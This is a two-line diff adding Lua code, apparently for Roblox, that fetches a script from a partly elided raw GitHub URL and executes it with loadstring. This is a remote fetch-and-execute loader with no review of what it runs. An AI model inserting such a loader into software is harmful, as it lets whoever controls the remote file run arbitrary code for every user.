@@ -1,0 +1,2 @@
+local codigo = game:HttpGet("https://raw.githubusercontent.com/.../1.lua")
+loadstring(codigo)()
